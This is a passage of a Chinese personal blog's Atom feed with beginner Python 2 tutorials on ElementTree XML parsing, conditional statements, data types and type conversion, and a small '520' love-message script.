class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">import</span> xml.etree.cElementTree <span class="keyword">as</span> ET</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;no c version Element Tree&#x27;</span></span><br><span class="line">    <span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_xml</span>():</span></span><br><span class="line">    properties = &#123;&#125;;</span><br><span class="line"></span><br><span class="line">    tree = ET.parse(<span class="string">&quot;cd.xml&quot;</span>);</span><br><span class="line">    docs = tree.getroot();</span><br><span class="line"></span><br><span class="line">    print_all_artist(docs);</span><br><span class="line">    print_all_cd_name_and_price(docs);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_all_artist</span>(<span class="params">docs</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;----------------------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> doc <span class="keyword">in</span> docs.<span class="built_in">iter</span>(<span class="string">&quot;ARTIST&quot;</span>):</span><br><span class="line">        <span class="built_in">print</span> doc.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_all_cd_name_and_price</span>(<span class="params">docs</span>):</span></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;----------------------------&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> doc <span class="keyword">in</span> docs:</span><br><span class="line">        line = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> field <span class="keyword">in</span> doc:</span><br><span class="line">            <span class="keyword">if</span> field.tag == <span class="string">&#x27;TITLE&#x27;</span>:</span><br><span class="line">                line = line + field.text + <span class="string">&quot;\t&quot;</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> field.tag == <span class="string">&#x27;PRICE&#x27;</span>:</span><br><span class="line">                line = line + field.text + <span class="string">&quot;\t&quot;</span></span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> line</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parse_xml();</span><br></pre></td></tr></table></figure><h3 id="3-运行结果"><a href="#3-运行结果" class="headerlink" title="3. 运行结果"></a>3. 运行结果</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:~ yeshaoting$ python parse_cd_xml.py</span><br><span class="line">----------------------------</span><br><span class="line">Bob Dylan</span><br><span class="line">Bonnie Tyler</span><br><span class="line">Dolly Parton</span><br><span class="line">Gary Moore</span><br><span class="line">Eros Ramazzotti</span><br><span class="line">----------------------------</span><br><span class="line">Empire Burlesque10.90</span><br><span class="line">Hide your heart9.90</span><br><span class="line">Greatest Hits9.90</span><br><span class="line">Still got the blues10.20</span><br><span class="line">Eros9.90</span><br></pre></td></tr></table></figure><h2 id="四、参考文档"><a href="#四、参考文档" class="headerlink" title="四、参考文档"></a>四、参考文档</h2><ul><li><a href="http://codingpy.com/article/parsing-xml-using-python/">深入解读Python解析XML的几种方式</a></li><li><a href="http://www.cnblogs.com/ifantastic/archive/2013/04/12/3017110.html">Python 标准库之 xml.etree.ElementTree</a></li><li><a href="http://www.runoob.com/python/python-xml.html">Python XML解析</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;p&gt;本文将介绍如何使用python基本类库xml.etree.ElementTree解析xml文档。&lt;/p&gt;
&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;h3 id=&quot;1-xml解析支持&quot;&gt;&lt;a href=&quot;#1-xml解析支持&quot; class=&quot;headerlink&quot; title=&quot;1. xml解析支持&quot;&gt;&lt;/a&gt;1. xml解析支持&lt;/h3&gt;&lt;p&gt;python标准库提供三种方法解析XML: SAX、DOM以及ElementTree。&lt;/p&gt;
&lt;h4 id=&quot;SAX-simple-API-for-XML&quot;&gt;&lt;a href=&quot;#SAX-simple-API-for-XML&quot; class=&quot;headerlink&quot; title=&quot;SAX (simple API for XML )&quot;&gt;&lt;/a&gt;SAX (simple API for XML )&lt;/h4&gt;&lt;p&gt;python 标准库包含SAX解析器，SAX用事件驱动模型，通过在解析XML的过程中触发一个个的事件并调用用户定义的回调函数来处理XML文件。&lt;/p&gt;
&lt;h4 id=&quot;DOM-Document-Object-Model&quot;&gt;&lt;a href=&quot;#DOM-Document-Object-Model&quot; class=&quot;headerlink&quot; title=&quot;DOM(Document Object Model)&quot;&gt;&lt;/a&gt;DOM(Document Object Model)&lt;/h4&gt;&lt;p&gt;将XML数据在内存中解析成一个树，通过对树的操作来操作XML。&lt;/p&gt;
&lt;h4 id=&quot;ElementTree-元素树&quot;&gt;&lt;a href=&quot;#ElementTree-元素树&quot; class=&quot;headerlink&quot; title=&quot;ElementTree(元素树)&quot;&gt;&lt;/a&gt;ElementTree(元素树)&lt;/h4&gt;&lt;p&gt;ElementTree就像一个轻量级的DOM，具有方便友好的API。代码可用性好，速度快，消耗内存少。&lt;/p&gt;
&lt;h3 id=&quot;2-ElementTree介绍&quot;&gt;&lt;a href=&quot;#2-ElementTree介绍&quot; class=&quot;headerlink&quot; title=&quot;2. ElementTree介绍&quot;&gt;&lt;/a&gt;2. ElementTree介绍&lt;/h3&gt;&lt;p&gt;xml.etree.ElementTree模块提供了一个轻量级、Pythonic的API，同时还有一个高效的C语言实现，即xml.etree.cElementTree。&lt;br&gt;与DOM相比，ET的速度更快，API使用更直接、方便。&lt;br&gt;与SAX相比，ET.iterparse函数同样提供了按需解析的功能，不会一次性在内存中读入整个文档。ET的性能与SAX模块大致相仿，但是它的API更加高层次，用户使用起来更加便捷。&lt;br&gt;因此，使用python解析xml时，推荐使用ElementTree这种方式。&lt;/p&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>python 520</title>
    <link href="http://yeshaoting.cn/article/python/python%20520/"/>
    <id>http://yeshaoting.cn/article/python/python%20520/</id>
    <published>2016-05-22T11:04:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>最近跟老婆大人都在学习python。<br>正值一年一度的5月20号之际，给老婆的礼物除了发520的红包外，就是这个老婆让我帮她完成的小小python程序了。</p><h2 id="二、代码"><a href="#二、代码" class="headerlink" title="二、代码"></a>二、代码</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        s = raw_input(<span class="string">&quot;请输入甜言蜜语：&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> s == <span class="string">&#x27;exit&#x27;</span> <span class="keyword">or</span> s == <span class="string">&#x27;quit&#x27;</span>:</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;爱的回应：六点就走，回家陪你。&#x27;</span></span><br></pre></td></tr></table></figure><h2 id="三、运行截图"><a href="#三、运行截图" class="headerlink" title="三、运行截图"></a>三、运行截图</h2><p>![520运行图]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/python">http://o7kubqw1j.bkt.clouddn.com//images/article/python</a> 520/520_run.png)<br>![520运行图]<a href="http://o7kubqw1j.bkt.clouddn.com//images/article/python">http://o7kubqw1j.bkt.clouddn.com//images/article/python</a> 520/520_run.png)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;

&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a</summary>
      
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>Python菜鸟教程学习笔记 - 条件语句</title>
    <link href="http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/"/>
    <id>http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5/</id>
    <published>2016-05-02T08:31:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><h2 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h2><p>python里的真为True，假为False，空为None.<br>Python程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。</p><h2 id="二、条件判断形式"><a href="#二、条件判断形式" class="headerlink" title="二、条件判断形式"></a>二、条件判断形式</h2><p>条件判断形式为：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> 判断条件<span class="number">1</span>:</span><br><span class="line">    执行语句<span class="number">1</span>……</span><br><span class="line"><span class="keyword">elif</span> 判断条件<span class="number">2</span>:</span><br><span class="line">    执行语句<span class="number">2</span>……</span><br><span class="line"><span class="keyword">elif</span> 判断条件<span class="number">3</span>:</span><br><span class="line">    执行语句<span class="number">3</span>……</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    执行语句<span class="number">4</span>……</span><br></pre></td></tr></table></figure><p><strong>注</strong>：别忘了if, elif, else关键字开头行尾的冒号。</p><span id="more"></span><h2 id="三、实例"><a href="#三、实例" class="headerlink" title="三、实例"></a>三、实例</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#coding=utf8</span></span><br><span class="line"></span><br><span class="line">value=raw_input(<span class="string">&quot;请输入100以内分数：&quot;</span>);</span><br><span class="line"></span><br><span class="line">score=<span class="built_in">int</span>(value);</span><br><span class="line"><span class="keyword">if</span> score &gt; <span class="number">90</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;优秀&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> score &gt; <span class="number">80</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;良好&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> score &gt; <span class="number">70</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;中等&#x27;</span></span><br><span class="line"><span class="keyword">elif</span> score &gt; <span class="number">60</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;及格&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;不及格&#x27;</span></span><br></pre></td></tr></table></figure><p>结果输出：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">请输入<span class="number">100</span>以内分数：<span class="number">20</span></span><br><span class="line">不及格</span><br><span class="line"></span><br><span class="line">请输入<span class="number">100</span>以内分数：<span class="number">89</span></span><br><span class="line">良好</span><br></pre></td></tr></table></figure><h2 id="四、补充"><a href="#四、补充" class="headerlink" title="四、补充"></a>四、补充</h2><p>由于 python 并不支持 switch 语句，所以多个条件判断，只能用 elif 来实现，如果判断需要多个条件需同时判断时，可以使用 or （或），表示两个条件有一个成立时判断条件成功；使用 and （与）时，表示只有两个条件同时成立的情况下，判断条件才成功。</p><h2 id="五、参考文档"><a href="#五、参考文档" class="headerlink" title="五、参考文档"></a>五、参考文档</h2><p><a href="http://www.runoob.com/python/python-if-statement.html">Python 条件语句</a></p>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、前言&quot;&gt;&lt;a href=&quot;#一、前言&quot; class=&quot;headerlink&quot; title=&quot;一、前言&quot;&gt;&lt;/a&gt;一、前言&lt;/h2&gt;&lt;p&gt;python里的真为True，假为False，空为None.&lt;br&gt;Python程序语言指定任何非0和非空（None）条件判断结果为True，0 或者None条件判断结果为False。&lt;/p&gt;
&lt;h2 id=&quot;二、条件判断形式&quot;&gt;&lt;a href=&quot;#二、条件判断形式&quot; class=&quot;headerlink&quot; title=&quot;二、条件判断形式&quot;&gt;&lt;/a&gt;二、条件判断形式&lt;/h2&gt;&lt;p&gt;条件判断形式为：&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; 判断条件&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    执行语句&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; 判断条件&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    执行语句&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;elif&lt;/span&gt; 判断条件&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    执行语句&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;……&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    执行语句&lt;span class=&quot;number&quot;&gt;4&lt;/span&gt;……&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;注&lt;/strong&gt;：别忘了if, elif, else关键字开头行尾的冒号。&lt;/p&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
    <category term="学习笔记" scheme="http://yeshaoting.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Python菜鸟教程学习笔记 - 数据类型</title>
    <link href="http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/"/>
    <id>http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%8F%98%E9%87%8F%E7%B1%BB%E5%9E%8B/</id>
    <published>2016-05-02T07:13:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><h2 id="一、标准数据类型"><a href="#一、标准数据类型" class="headerlink" title="一、标准数据类型"></a>一、标准数据类型</h2><p>Python有五个标准的数据类型：</p><ul><li>Numbers（数字）</li><li>String（字符串）</li><li>List（列表）</li><li>Tuple（元组）</li><li>Dictionary（字典）</li></ul><h2 id="二、数字"><a href="#二、数字" class="headerlink" title="二、数字"></a>二、数字</h2><p>Python支持四种不同的数字类型：</p><ul><li>int（有符号整型）</li><li>long（长整型[也可以代表八进制和十六进制]）</li><li>float（浮点型）</li><li>complex（复数）</li></ul><p>长整型定义在数值后添加一个小写或者大写的”L”，python中没有double类型数字。</p><p>使用完一个对象后，可通过del关键字删除对象引用。语法：<br>del var1[,var2[,var3[….,varN]]]]</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">value = <span class="number">25</span></span><br><span class="line">string = <span class="string">&quot;yes&quot;</span></span><br><span class="line"><span class="keyword">del</span> value, string</span><br></pre></td></tr></table></figure><p>如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：<code>NameError: name &#39;value&#39; is not defined</code></p><span id="more"></span><h2 id="三、字符串"><a href="#三、字符串" class="headerlink" title="三、字符串"></a>三、字符串</h2><h2 id="四、列表"><a href="#四、列表" class="headerlink" title="四、列表"></a>四、列表</h2><h2 id="五、元组"><a href="#五、元组" class="headerlink" title="五、元组"></a>五、元组</h2><h2 id="六、字典"><a href="#六、字典" class="headerlink" title="六、字典"></a>六、字典</h2><h2 id="七、数据类型转换"><a href="#七、数据类型转换" class="headerlink" title="七、数据类型转换"></a>七、数据类型转换</h2><table><thead><tr><th>函数</th><th>描述</th></tr></thead><tbody><tr><td>int(x [,base ])</td><td>将x转换为一个整数</td></tr><tr><td>long(x [,base ])</td><td>将x转换为一个长整数</td></tr><tr><td>float(x )</td><td>将x转换到一个浮点数</td></tr><tr><td>complex(real [,imag ])</td><td>创建一个复数</td></tr><tr><td>str(x)</td><td>将对象 x 转换为字符串</td></tr><tr><td>repr(x)</td><td>将对象 x 转换为表达式字符串</td></tr><tr><td>eval(str)</td><td>用来计算在字符串中的有效Python表达式,并返回一个对象</td></tr><tr><td>tuple(s)</td><td>将序列 s 转换为一个元组</td></tr><tr><td>list(s)</td><td>将序列 s 转换为一个列表</td></tr><tr><td>chr(x)</td><td>将一个整数转换为一个字符</td></tr><tr><td>unichr(x)</td><td>将一个整数转换为Unicode字符</td></tr><tr><td>ord(x)</td><td>将一个字符转换为它的整数值</td></tr><tr><td>hex(x)</td><td>将一个整数转换为一个十六进制字符串</td></tr><tr><td>oct(x)</td><td>将一个整数转换为一个八进制字符串</td></tr></tbody></table><p>对于数值转换而言，如果字面量不是一个整数，会报错：<code>ValueError: invalid literal for int() with base 10: &#39;1s</code><br>正确实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&quot;12&quot;</span>; long(a);</span><br><span class="line"><span class="number">12L</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&quot;12&quot;</span>; <span class="built_in">int</span>(a);</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&quot;12&quot;</span>; <span class="built_in">float</span>(a);</span><br><span class="line"><span class="number">12.0</span></span><br></pre></td></tr></table></figure><p>对于元组，列表转换而言，如果字面量不可迭代，会报错：<code>TypeError: &#39;int&#39; object is not iterable</code><br>正确实例：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;12&#x27;</span>; <span class="built_in">list</span>(a);</span><br><span class="line">[<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a=<span class="string">&#x27;12&#x27;</span>; <span class="built_in">tuple</span>(a);</span><br><span class="line">(<span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="八、参考文档"><a href="#八、参考文档" class="headerlink" title="八、参考文档"></a>八、参考文档</h2><ul><li><a href="http://www.runoob.com/python/python-variable-types.html">Python 变量类型</a></li><li><a href="http://www.runoob.com//python/python-numbers.html">Python Number(数字)</a></li><li><a href="http://www.runoob.com//python/python-strings.html">Python 字符串</a></li><li><a href="http://www.runoob.com//python/python-lists.html">Python 列表(List)</a></li><li><a href="http://www.runoob.com//python/python-tuples.html">Python 元组</a></li><li><a href="http://www.runoob.com//python/python-dictionary.html">Python 字典(Dictionary)</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;img src=&quot;/asserts/images/logo/python.png&quot; class=&quot;img-logo img-center&quot; /&gt;


&lt;h2 id=&quot;一、标准数据类型&quot;&gt;&lt;a href=&quot;#一、标准数据类型&quot; class=&quot;headerlink&quot; title=&quot;一、标准数据类型&quot;&gt;&lt;/a&gt;一、标准数据类型&lt;/h2&gt;&lt;p&gt;Python有五个标准的数据类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Numbers（数字）&lt;/li&gt;
&lt;li&gt;String（字符串）&lt;/li&gt;
&lt;li&gt;List（列表）&lt;/li&gt;
&lt;li&gt;Tuple（元组）&lt;/li&gt;
&lt;li&gt;Dictionary（字典）&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;二、数字&quot;&gt;&lt;a href=&quot;#二、数字&quot; class=&quot;headerlink&quot; title=&quot;二、数字&quot;&gt;&lt;/a&gt;二、数字&lt;/h2&gt;&lt;p&gt;Python支持四种不同的数字类型：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;int（有符号整型）&lt;/li&gt;
&lt;li&gt;long（长整型[也可以代表八进制和十六进制]）&lt;/li&gt;
&lt;li&gt;float（浮点型）&lt;/li&gt;
&lt;li&gt;complex（复数）&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;长整型定义在数值后添加一个小写或者大写的”L”，python中没有double类型数字。&lt;/p&gt;
&lt;p&gt;使用完一个对象后，可通过del关键字删除对象引用。语法：&lt;br&gt;del var1[,var2[,var3[….,varN]]]]&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;value = &lt;span class=&quot;number&quot;&gt;25&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;string = &lt;span class=&quot;string&quot;&gt;&amp;quot;yes&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;del&lt;/span&gt; value, string&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;如若在删除对象引用还继续使用对象的话，则会报变量未定义的错误：&lt;code&gt;NameError: name &amp;#39;value&amp;#39; is not defined&lt;/code&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="系统脚本" scheme="http://yeshaoting.cn/categories/%E7%B3%BB%E7%BB%9F%E8%84%9A%E6%9C%AC/"/>
    
    
    <category term="python" scheme="http://yeshaoting.cn/tags/python/"/>
    
    <category term="学习笔记" scheme="http://yeshaoting.cn/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>Python菜鸟教程学习笔记 - 基础语法</title>
    <link href="http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/"/>
    <id>http://yeshaoting.cn/article/python/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/</id>
    <published>2016-05-02T07:13:00.000Z</published>
    <updated>2021-07-01T04:25:32.000Z</updated>
    
    <content type="html"><![CDATA[<img src="/asserts/images/logo/python.png" class="img-logo img-center" /><h2 id="一、第一个Python程序"><a href="#一、第一个Python程序" class="headerlink" title="一、第一个Python程序"></a>一、第一个Python程序</h2><h3 id="1-交互式编程"><a href="#1-交互式编程" class="headerlink" title="1. 交互式编程"></a>1. 交互式编程</h3><p>在mac或者linux终端输入python命令即可进入交互式编程。如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">yerba-buena:pystudy yeshaoting$ python</span><br><span class="line">Python <span class="number">2.7</span><span class="number">.10</span> (default, Jul <span class="number">14</span> <span class="number">2015</span>, <span class="number">19</span>:<span class="number">46</span>:<span class="number">27</span>)</span><br><span class="line">[GCC <span class="number">4.2</span><span class="number">.1</span> Compatible Apple LLVM <span class="number">6.0</span> (clang-<span class="number">600.0</span><span class="number">.39</span>)] on darwin</span><br><span class="line"><span class="type">Type</span> <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> <span class="keyword">or</span> <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-脚本式编程"><a href="#2-脚本式编程" class="headerlink" title="2. 脚本式编程"></a>2. 脚本式编程</h3><p>将python代码写入一个以.py为扩展名的python文件，如：test.py。<br>脚本写完后，可以通过如下二种方式执行python脚本：python test.py。</p><p>若python文件里设置了python shebang，则可以通过./test.py来执行。</p><h2 id="二、python标识符"><a href="#二、python标识符" class="headerlink" title="二、python标识符"></a>二、python标识符</h2><blockquote><p>在python里，标识符有字母、数字、下划线组成。所有标识符可以包括英文、数字以及下划线（_），但不能以数字开头。</p></blockquote><blockquote><p>python中的标识符是区分大小写的。</p></blockquote><blockquote><p>以下划线开头的标识符是有特殊意义的。<br>以单下划线开头（_foo）的代表不能直接访问的类属性，需通过类提供的接口进行访问，不能用“from xxx import *”而导入；<br>以双下划线开头的（__foo）代表类的私有成员；<br>以双下划线开头和结尾的（__foo__）代表python里特殊方法专用的标识，如__init__()代表类的构造函数。</p></blockquote><h2 id="三、Python保留字符"><a href="#三、Python保留字符" class="headerlink" title="三、Python保留字符"></a>三、Python保留字符</h2><table><thead><tr><th align="center">and</th><th align="center">exec</th><th align="center">not</th></tr></thead><tbody><tr><td align="center">assert</td><td 